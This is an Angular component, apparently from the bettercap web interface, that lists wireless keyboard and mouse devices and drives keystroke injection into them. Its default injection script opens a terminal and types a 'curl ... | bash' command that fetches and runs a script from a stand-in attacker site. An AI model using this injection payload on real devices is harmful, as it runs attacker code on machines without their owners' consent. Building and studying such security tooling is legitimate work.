import {Component, OnInit, OnDestroy, ViewChild} from '@angular/core';
import { SortService, ColumnSortedEvent } from '../../services/sort.service';
import {ApiService} from '../../services/api.service';
import {HIDDevice} from '../../models/hid.device';
import {Module} from '../../models/module';
import { OmnibarComponent } from '../omnibar/omnibar.component';

declare var $: any;

@Component({
    selector: 'hydra-hid-table',
    templateUrl: './hid-table.component.html',
    styleUrls: ['./hid-table.component.scss']
})
export class HidTableComponent implements OnInit, OnDestroy {
    @ViewChild(OmnibarComponent) omnibar:OmnibarComponent;

    devices: HIDDevice[] = [];
    hid: Module = null;
    sort: ColumnSortedEvent;
    sortSub: any;
    visibleMenu: string = "";

    state: any = {
        sniffing: "",
        injecting: false
    };
    injDev: any = {
        tokens: [],
        address: "",
        payloads: []
    };
    curDev: any = {
        tokens: [],
        address: "",
        payloads: []
    };

    constructor(private api: ApiService, private sortService: SortService) { 
        this.sort = {field: 'address', direction: 'asc', type:''};
        this.update(this.api.session.hid['devices']);
    }

    ngOnInit() {
        this.api.onNewData.subscribe(session => {
            this.update(session.hid['devices']);
        });

        this.sortSub = this.sortService.onSort.subscribe(event => {
            this.sort = event;
            this.sortService.sort(this.devices, event);
        });
    }

    ngOnDestroy() {
        this.sortSub.unsubscribe();
    }

    setAlias(dev) {
        $('#in').val(dev.alias);
        $('#inhost').val(dev.address);
        $('#inputModalTitle').html('Set alias for ' + dev.address);
        $('#inputModal').modal('show');
    }

    doSetAlias() {
        $('#inputModal').modal('hide');

        let mac = $('#inhost').val();
        let alias = $('#in').val();

        if( alias.trim() == "" )
            alias = '""';

        this.api.cmd("alias " + mac + " " + alias);
    }

    showInjectModal(dev) {
        let pathToken = { label: 'Save As', id: 'PATH', value: '/tmp/bettercap-hid-script.txt' };
        let dataToken = { label: 'Code', id: 'DATA', value:
            "GUI\n" +
            "DELAY 500\n" +
            "STRING Terminal\n" +
            "DELAY 500\n" +
            "ENTER\n" +
            "DELAY 500\n" +
            "STRING curl -L http://www.evilsite.com/commands.sh | bash\n" +
            "ENTER\n" +
            "STRING exit\n" +
            "ENTER" 
        };

        this.injDev = dev;
        this.injDev.tokens = [
            { label: 'Device', id: 'ADDRESS', value: dev.address.toUpperCase() },
            { label: 'Layout', id: 'LAYOUT', value: 'US' },
            pathToken,
            dataToken 
        ];

        this.api.readFile(pathToken.value).subscribe(
            (val) => {
                dataToken.value = String(val);
            },
            error => {
                $('#injectModal').modal('show');
            },
            () => {
                $('#injectModal').modal('show');
            });
    }

    doInjection() {
        let parts = {};

        for( let i = 0; i < this.injDev.tokens.length; i++ ) {
            let tok = this.injDev.tokens[i];
            let val = $('#tok'+tok.id).val();

            parts[tok.id] = (val == "" && tok.id != 'DATA' ? '""' : val);
        }

        $('#injectModal').modal('hide');

        this.api.writeFile(parts['PATH'], parts['DATA']).subscribe(
            (val) => {
                this.api.cmd('hid.inject ' + parts['ADDRESS'] + ' ' + parts['LAYOUT'] + ' ' + parts['PATH']);
            },
            error => {},
            () => {}
        );
    }

    showPayloadsModal(dev) {
        this.curDev = dev;
        $('#payloadsModal').modal('show');
    }

    private update(devices) {
        this.hid = this.api.module('hid');
        this.state = this.hid.state;
        this.devices = devices; 
        this.sortService.sort(this.devices, this.sort);

        if( this.curDev != null ) {
            for( let i = 0; i < this.devices.length; i++ ) {
                let dev = this.devices[i];
                if( dev.address == this.curDev.address ) {
                    this.curDev = dev;
                    break;
                }
            }
        }
    }
}
